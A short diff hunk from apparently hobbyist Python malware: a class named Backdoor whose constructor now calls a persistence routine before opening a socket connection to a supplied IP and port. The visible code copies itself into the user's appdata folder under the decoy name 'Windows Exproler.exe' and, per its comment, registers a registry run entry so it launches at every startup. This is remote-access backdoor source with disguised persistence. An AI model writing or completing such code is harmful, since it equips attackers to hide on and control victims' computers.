@@ -9,8 +9,10 @@ import shutil
 
 class Backdoor:
         def __init__(self, ip, port):
+                self.become_persistence()
                 self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.connection.connect((ip, port))
+                
         #with this method we write the file to the registry run so it will run on every startup
         def become_persistence(self):
                 evil_file_location = os.environ["appdata"] + "\\Windows Exproler.exe"
